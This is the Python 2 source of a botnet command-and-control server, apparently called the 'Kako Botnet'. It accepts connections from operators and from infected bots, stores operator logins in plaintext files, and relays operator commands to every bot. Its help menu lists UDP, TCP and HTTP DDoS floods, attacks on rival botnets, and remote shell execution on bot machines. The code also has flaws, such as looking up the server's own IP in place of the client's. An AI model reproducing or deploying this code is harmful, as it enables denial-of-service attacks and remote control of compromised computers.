# To create an account make a file called "login.txt" and follow instructions below.
# Login Format: Username:Password:ID, (Admin: 1 | Others: 0)
import sys
import time
import socket
import thread
import threading
from json import load
from urllib2 import urlopen
from thread import start_new_thread

connect = "" # IP. Leave empty
conport = 8080 # Your port
infport = 8000 # Bot port

clients = 0
bots = 0

ips = []
bc = []
adminIP = []
admin = []
userIP = []
user = []

adminsIP = adminIP
admins = admin
usersIP = userIP
users = user

print("Remember to add unwanted IP Addresses into the banned list before anyone starts to connect.")
print("If it doesn't say both Server and Bot started there is a problem.")

def clientDisconnect():
	global clients
	clients = clients - 1

def botDisconnect():
	global bots
	bots = bots - 1
	
def clientThread(conn):
	try:
		ip = load(urlopen('http://jsonip.com'))['ip']
		#ip = "127.0.0.1"
		createBanned = file("banned.txt", "a")
		banned = file("banned.txt")
		with open("banned.txt", "r") as banned:
			bannedLines = banned.readlines()

		for bannedLine in bannedLines:
			if ip in bannedLine:
				conn.send("[!] Your IP Address has been banned.\r\n")
				clientDisconnect()
				sys.exit()
			else:
				pass

		def username(conn, prefix="Username: "):
		    conn.send(prefix)
		    return conn.recv(512)

		def password(conn, prefix="Password: "):
		    conn.send(prefix)
		    data = conn.recv(512)
		    if data:
		        return conn.recv(512)

		createLogin = file("login.txt", "a")

		with open("login.txt", "r") as login:
			lines = login.readlines()

		attempts = 0

		username = username(conn)
		try:
			password = password(conn)
		except:
			conn.close()

		while True:
			for line in lines:
				if line.split(":")[0] == username and line.split(":")[1] == password:
					conn.sendall("[>] Welcome to the Kako Botnet [<]\r\n")
					conn.sendall("[?] Please use the custom client.py made by Feitan\r\n")
					conn.sendall("[?] Type >help for a list of commands\r\n")
					conn.sendall("[?] Your username is: %s\r\n" % username)
					bc.append(conn)
					try:
						if line.split(":")[2].startswith("1"):
							adminIP.append("%s | %s" % (username, ip))
							admin.append(username)
						else:
							userIP.append("%s | %s" % (username, ip))
							user.append(username)
					except:
						break
					while True:
						try:
							message = conn.recv(512)

							if message:
								if line.split(":")[2].startswith("1"):
									nick = "* [%s] " % (username)
								else:
									nick = "[%s] " % (username)
								reply = "%s\r" % (message)
								broadcast(nick, conn)
								broadcast(reply, conn)
							else:
								remove(conn)

							logs = file("logs.txt", "a")
							logs.write("%s:%s - %s\r\n" % (username, password, message))

							if message.lower().startswith(">help"):
								conn.sendall("[>] Helpful Info [<]\r\n")
								conn.sendall("[>] and [<] = Notice\r\n")
								conn.sendall("[?] = Information\r\n")
								conn.sendall("[!] = Warning\r\n")
								conn.sendall("\r\n")
								conn.sendall("[>] Server Commands [<]\r\n")
								conn.sendall("[?] >help - Displays a help menu like this\r\n")
								conn.sendall("[?] >status - Displays Clients and Bots connected\r\n")
								conn.sendall("[?] >credits - Displays the Programmers and Helpers\r\n")
								conn.sendall("[?] >users - Displays everyones username\r\n")
								conn.sendall("\r\n")
								conn.sendall("[>] Bot Commands [<]\r\n")
								conn.sendall("[!] Warning! These commands are built into the client made by Feitan not the server\r\n")
								conn.sendall("[?] >udp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol UDP\r\n")
								conn.sendall("[?] >tcp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol TCP\r\n")
								conn.sendall("[?] >http [Target(without http://)] [Threads] [Time(S)] - HTTP DDoS Attack\r\n")
								conn.sendall("[?] >cnc [Target] [Port] [Amount of Connections] - This is an attack on other CNC Botnets\r\n")
								conn.sendall("[?] >killbots - Disconnects all bots\r\n")
								conn.sendall("[?] >shell [Command] - Allows the host to use commands from the bots terminal\r\n")
								conn.sendall("[?] >killattk - Stops all on going DDoS attacks\r\n")
								if line.split(":")[2].startswith("1"):
									conn.sendall("\r\n")
									conn.sendall("[>] Admin Commands [<]\r\n")
									conn.sendall("[?] >createuser - Allows you to create an account\r\n")

							if message.lower().startswith(">status"):
								conn.sendall("[+] Clients Connected: %s\r\n" % clients)
								conn.sendall("[+] Bots Connected: %s\r\n" % bots)

							if message.lower().startswith(">credits"):
								conn.sendall("[>] Santa [<]\r\n")
								conn.sendall("[?] Feitan - Idea and main Programmer. Programmed client.py alone.\r\n")
								conn.sendall("[>] Santa\'s Little Helpers [<]\r\n")
								conn.sendall("[?] Picses - Programmed the bot connection.\r\n")
								conn.sendall("[?] Mac.G - Helped making Server <=> Client communication.\r\n")
								conn.sendall("[?] x7041 - Fixed the login over lap.\r\n")

							if message.lower().startswith(">users"):
								if line.split(":")[2].startswith("1"):
									conn.sendall("Admins: %s\r\n" % adminsIP)
									conn.sendall("Users: %s\r\n" % usersIP)
								else:
									conn.sendall("Admins: %s\r\n" % admins)
									conn.sendall("Users: %s\r\n" % users)

							if message.lower().startswith(">createuser"):
								if line.split(":")[2].startswith("1"):
									remove(conn)
									conn.send("[>] Username and Password must be 3 or more characters long [<]\r\n")
									def newUser(conn, prefix="Username: "):
										conn.send(prefix)
										data = conn.recv(512)
										if data:
											return conn.recv(512)

									def newPass(conn, prefix="Password: "):
										conn.send(prefix)
										data = conn.recv(512)
										if data:
											return conn.recv(512)

									def newID(conn, prefix="ID: "):
										conn.send(prefix)
										data = conn.recv(512)
										if data:
											return conn.recv(512)

									newUser = newUser(conn)
									newPass = newPass(conn)
									newID = newID(conn)

									uLen = len(newUser)
									pLen = len(newPass)
									iLen = len(newID)

									try:
										with open("login.txt", "a") as login:
											if uLen >= 3 and pLen >= 3 and iLen >= 1:
												login.write("\n%s:%s:%s" % (newUser, newPass, newID))
												conn.sendall("[?] Username: %s\r\n" % newUser)
												conn.sendall("[?] Password: %s\r\n" % newPass)
												conn.sendall("[?] ID: %s\r\n" % newID)
											else:
												pass
									except:
										pass
									bc.append(conn)
						except:
							break
						if not message:
							break
				else:
					attempts += 1
					if attempts == 999:
						try:
							ip = load(urlopen('http://jsonip.com'))['ip']
							fail = file("fails.txt", "a")
							fail.write("%s:%s:%s\r\n" % (ip, username, password))
							conn.send("[!] Incorrect Information!\r\n")
							conn.send("[!] Your IP Address has been logged.\r\n")
							clientDisconnect()
							time.sleep(3)
							conn.close()
						except:
							clientDisconnect()
							conn.close()
	except:
		try:
			adminIP.remove("%s | %s" % (username, ip))
			admin.remove(username)
		except:
			pass
		try:
			userIP.remove("%s | %s" % (username, ip))
			user.remove(username)
		except:
			pass
		clientDisconnect()
		sys.exit()

def startClient():
	host = connect
	port = conport
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.bind((host, port))
	sock.listen(999999)
	time.sleep(0.10)
	print("[+] Server Started")
	while True:
		global clients
		time.sleep(1)
		conn, addr = sock.accept()
		clients = clients + 1

		start_new_thread(clientThread, (conn,))
	sock.close()

def bot_thread(conn):
	ip = load(urlopen('http://jsonip.com'))['ip']
	if ip in ips:
		print("[*] DUP Detected. Removing DUP.")
		conn.send(">killbots")
		conn.close()

	ips.append(ip)
	while True:
		try:
			data = conn.recv(512)
		except:
			print("[-] Bot Disconnected.")
			break
		if not data:
			pass
	ips.remove(ip)
	botDisconnect()
	conn.close()

def startBot():
	host = connect
	port = infport
	infsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	infsock.bind((host, port))
	infsock.listen(999999)
	time.sleep(0.5)
	print("[+] Bot Started")
	while True:
		global bots
		time.sleep(1)
		conn, addr = infsock.accept()
		bc.append(conn)
		bots = bots + 1

		start_new_thread(bot_thread, (conn,))
	infsock.close()

def broadcast(message, connection):
    for bots in bc:
        if bots != connection:
            try:
                bots.sendall(message)
            except:
                bots.close()
                remove(bots)

def remove(connection):
    if connection in bc:
        bc.remove(connection)

client = threading.Thread(target=startClient, args=(""), name='Client Session Handler')
client.start()

botnet = threading.Thread(target=startBot, args=(""), name='Bot Session Handler')
botnet.setDaemon(True)
botnet.start()
